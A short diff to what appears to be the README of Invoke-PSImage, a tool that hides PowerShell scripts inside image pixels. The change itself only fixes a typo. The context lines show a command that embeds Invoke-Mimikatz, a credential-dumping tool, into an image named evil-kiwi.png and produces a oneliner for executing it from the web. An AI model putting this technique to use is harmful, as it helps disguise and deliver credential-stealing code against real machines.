@@ -35,7 +35,7 @@ PS>Import-Module .\Invoke-PSImage.ps1
 PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Image .\kiwi.jpg -Out .\evil-kiwi.png -Web
    [Oneliner to execute from the web]
 ``` 
-Onliner broken down from the image below
+Oneliner broken down from the image below
 ```
 sal a New-Object
 
